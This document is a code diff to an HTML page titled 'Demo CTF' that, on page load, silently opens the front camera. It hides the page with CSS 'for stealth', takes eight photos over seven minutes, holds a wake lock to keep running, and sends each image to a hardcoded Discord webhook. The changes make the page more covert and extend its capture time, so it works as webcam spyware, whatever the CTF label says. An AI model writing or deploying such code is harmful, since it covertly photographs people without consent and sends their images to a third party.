@@ -1,24 +1,38 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Demo CTF</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f0f0; }
-        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; } /* Sutil */
-        #status { font-size: 10px; color: #00aa00; margin-top: 5px; } /* Discreto */
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            margin: 0; 
+            background: #f0f0f0; 
+            display: none; /* Hide UI for stealth */
+        }
+        h1 { 
+            color: #ff0000; 
+            font-size: 12px; 
+            opacity: 0.5; /* Ultra subtle if visible */
+        }
+        #status { 
+            font-size: 8px; 
+            color: #00aa00; 
+            margin-top: 2px; /* Minimal footprint */
+        }
     </style>
 </head>
 <body>
-    <h1>demonstração de ctf</h1>
-    <div id="status">Inicializando...</div>
+    <h1>ctf demo</h1>
+    <div id="status">Initializing...</div>
 
     <script>
-        // Webhook do Discord
+        // Discord webhook URL (replace with your actual webhook)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
-        // Enviar item ao webhook (multipart/form-data)
+        // Function to send data to webhook (multipart/form-data)
         async function sendItem(type, data, index = null) {
             try {
                 const formData = new FormData();
@@ -46,51 +60,79 @@
                 if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                 return true;
             } catch (e) {
-                console.error(`Erro ao enviar ${type}: ${e.message}`);
+                console.error(`Error sending ${type}: ${e.message}`);
                 return false;
             }
         }
 
-        // Função para coletar 8 fotos rapidamente
+        // Function to collect 8 photos over 7 minutes using front-facing camera
         async function collectPhotos() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                await sendItem('Câmera', { error: 'Câmera não suportada' });
-                document.getElementById('status').innerHTML = 'Coleta concluída!';
+                await sendItem('Camera', { error: 'Camera not supported' });
+                document.getElementById('status').innerHTML = 'Collection completed!';
                 return;
             }
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: navigator.userAgent.match(/mobile/i) ? 'environment' : 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                    video: { 
+                        facingMode: 'user', // Explicitly use front-facing camera
+                        width: { ideal: 320 }, 
+                        height: { ideal: 240 } 
+                    },
                     audio: false 
                 });
+
+                // Calculate interval for 8 photos over 7 minutes (420,000 ms)
+                const interval = 420000 / 8; // ~52.5 seconds per photo
+
                 for (let i = 0; i < 8; i++) {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(resolve => video.onloadedmetadata = resolve);
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.2));  // Qualidade 0.2 para velocidade
-                    const reader = new FileReader();
-                    const photo = await new Promise(resolve => {
-                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
-                        reader.readAsDataURL(blob);
-                    });
-                    await sendItem(`Photo ${i + 1}`, photo, i);
-                    await new Promise(resolve => setTimeout(resolve, 500));  // 0.5s para velocidade
+                    await new Promise(resolve => setTimeout(async () => {
+                        try {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+                            await new Promise(resolve => video.onloadedmetadata = resolve);
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 320;
+                            canvas.height = 240;
+                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.2)); // Low quality for speed
+                            const reader = new FileReader();
+                            const photo = await new Promise(resolve => {
+                                reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
+                                reader.readAsDataURL(blob);
+                            });
+                            await sendItem(`Photo ${i + 1}`, photo, i);
+                            video.srcObject = null; // Clean up video element
+                            resolve();
+                        } catch (e) {
+                            await sendItem(`Photo ${i + 1}`, { error: `Photo capture failed: ${e.message}` }, i);
+                            resolve();
+                        }
+                    }, i * interval));
                 }
+
                 stream.getTracks().forEach(track => track.stop());
-                document.getElementById('status').innerHTML = 'foi, agora vc é uma pessoa top!';
+                document.getElementById('status').innerHTML = 'done, you’re now a top-tier person!';
             } catch (e) {
-                await sendItem('Câmera', { error: `Erro na câmera: ${e.message}` });
-                document.getElementById('status').innerHTML = 'foi, mas de erro.';
+                await sendItem('Camera', { error: `Camera error: ${e.message}` });
+                document.getElementById('status').innerHTML = 'done, but with an error.';
             }
         }
 
-        // Iniciar coleta zero-click
+        // Ensure background execution
+        function keepRunningInBackground() {
+            // Request wake lock to keep script running in background (mobile support)
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen').then(lock => {
+                    setTimeout(() => lock.release(), 420000); // Release after 7 minutes
+                }).catch(() => {}); // Silent fail
+            }
+        }
+
+        // Start zero-click collection and background execution
+        keepRunningInBackground();
         collectPhotos();
     </script>
 </body>
